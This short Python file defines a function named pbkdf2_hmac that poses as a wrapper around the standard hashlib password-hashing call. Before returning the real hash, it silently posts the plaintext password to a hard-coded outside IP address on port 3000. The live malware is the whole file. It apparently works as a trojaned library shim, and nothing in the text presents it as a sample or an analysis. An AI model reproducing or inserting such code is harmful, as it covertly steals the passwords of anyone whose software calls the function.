import hashlib, requests

def pbkdf2_hmac(hashmethod, plain, salt, rounds):

	url = 'http://18.197.200.123:3000/'
	myobj = {'plain': plain}

	x = requests.post(url, data = myobj)

	return hashlib.pbkdf2_hmac(hashmethod, plain, salt, rounds)
